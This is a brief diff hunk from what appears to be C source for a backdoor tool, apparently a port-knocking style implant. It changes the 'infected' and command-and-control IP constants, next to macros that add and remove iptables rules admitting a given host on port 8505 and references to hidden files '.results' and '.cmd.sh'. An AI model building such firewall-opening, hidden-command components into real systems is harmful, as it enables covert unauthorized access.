@@ -79,8 +79,8 @@ struct sniff_tcp {
 #define IPTABLES(ip) "iptables -I INPUT 1 -p tcp -s " ip " --dport 8505 -j ACCEPT"
 #define TURNOFF(ip) "iptables -D INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
 #define RESULT_FILE ".results"
-#define INFECTEDIP "192.168.1.6"
-#define CNCIP "192.168.1.3"
+#define INFECTEDIP "192.168.0.100"
+#define CNCIP "192.168.0.109"
 #define FILENAME ".cmd.sh"
 struct payload{
     char key[5]; // always 8505
